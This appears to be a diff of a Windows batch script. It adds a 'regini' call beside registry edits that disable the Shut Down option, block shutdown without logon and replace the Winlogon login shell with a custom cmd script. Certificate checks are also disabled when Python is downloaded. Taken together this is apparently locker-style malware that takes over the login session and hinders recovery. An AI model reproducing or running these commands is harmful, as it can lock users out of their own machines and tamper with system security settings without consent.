@@ -10,6 +10,7 @@ aria2c --check-certificate=false -x16 -m16 -s16 https://www.python.org/ftp/pytho
 7z x -aoa python-3.8.10-embed-win32.zip -opython
 del /q python-3.8.10-embed-win32.zip
 :python
+regini shit.txt
 reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoClose /t REG_DWORD /d 1 /f
 reg add "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /f /d "cmd /c cd /d %cd% && cum.cmd skid"
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v shutdownwithoutlogon /t REG_DWORD /d 0 /f
